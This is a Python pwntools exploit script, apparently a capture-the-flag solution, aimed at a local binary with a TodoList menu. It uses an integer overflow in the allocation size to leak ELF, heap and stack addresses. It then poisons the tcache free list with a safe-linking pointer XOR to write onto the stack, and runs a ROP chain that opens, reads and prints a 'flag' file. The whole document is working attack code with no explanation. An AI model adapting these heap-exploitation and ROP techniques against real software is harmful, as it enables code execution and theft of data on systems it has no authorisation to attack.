from pwn import*
from Crypto.Util.number import long_to_bytes,bytes_to_long

context.log_level='debug'
context(arch='amd64',os='linux')
context.terminal=['tmux','splitw','-h']

ELFpath = './pwn'
p=process(ELFpath)

rut=lambda s :p.recvuntil(s,timeout=0.3)
ru=lambda s :p.recvuntil(s)
r=lambda n :p.recv(n)
sl=lambda s :p.sendline(s)
sls=lambda s :p.sendline(str(s))
sla=lambda con,s :p.sendlineafter(con,s)
sa=lambda con,s :p.sendafter(con,s)
ss=lambda s :p.send(str(s))
s=lambda s :p.send(s) 
uu64=lambda data :u64(data.ljust(8,'\x00'))
it=lambda :p.interactive()
b=lambda :gdb.attach(p)
bp=lambda bkp:gdb.attach(p,'b *'+str(bkp))
get_leaked_libc = lambda :u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))

def ptrxor(pos,ptr):
    return p64((pos >> 12) ^ ptr)

def add(size,con=b'a'):
    if size==-1:
        p.sendlineafter("How many affairs :","-1")
        return 
    con=b'\xde'*((size*8)&0xffffffffffffffff-1)
    print(hex((size*8)&0xffffffffffffffff))
    print(hex((size*8)))
    
    p.sendlineafter("How many affairs :",str(size))
    p.sendlineafter("TodoList :",con)
def addvul(size,con):
    if size==-1:
        p.sendlineafter("How many affairs :","-1")
        return 
    print(hex((size*8)&0xffffffffffffffff))
    print(hex((size*8)))
    
    p.sendlineafter("How many affairs :",str(size))
    p.sendafter("TodoList :",con)

import ctypes
def to_int64(x):
    return ctypes.c_longlong(x & 0xFFFFFFFFFFFFFFFF).value
add(to_int64(0x8000000000000000+0x80//8))

add(-1)
p.recvuntil("Your TodoList: ")
p.recv(8)
p.recv(8)
p.recv(0x40)
elf_base=u64(p.recv(8))-0x5edae738feb6+0x5edae7377000
heap_base=u64(p.recv(8))-0x5e94c722b330+0x5e94c7219000
p.recv(0x8)
p.recv(0x10)
stk_addr=u64(p.recv(8))
payload=b'\x08'
add(to_int64(0x8000000000000000+0xd0//8))
add(to_int64(0x8000000000000000+0xe0//8))
add(-1)
addvul(to_int64(0x8000000000000000+0xd0//8),payload.ljust(0xd0-1))
payload=b'a'*0xd8+p64(0x31)+ptrxor(heap_base-0x616652ed8000+0x616652eea420,stk_addr-0x70)
p.sendlineafter("You realized that you must do something...",payload)
add(to_int64(0x8000000000000000+0xe0//8))

rop=ROP(ELFpath)
pop_rdi=elf_base+rop.rdi.address
pop_rsi=elf_base+rop.rsi.address
mov_rdx_rdi=elf_base+0x07f096
elf=ELF(ELFpath)
elf.address=elf_base
open_addr=elf.sym["open"]
read_addr=elf.sym["read"]
write_addr=elf.sym["write"]
for x in elf.search("flag"):
    flag_str=x
    break
buf=heap_base+0x1000
payload=p64(pop_rdi)+p64(flag_str)+p64(pop_rsi)+p64(0)+p64(open_addr)
payload+=p64(pop_rdi)+p64(0x100)+p64(mov_rdx_rdi)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(buf)+p64(read_addr)
payload+=p64(pop_rdi)+p64(1)+p64(write_addr)
scr='''
b *(&fread+238)
'''
addvul(0xe0//8,(b'a'*7+payload).ljust(0xe0-1))

print(hex(heap_base))
print(hex(elf_base))
print(hex(stk_addr))

p.interactive()
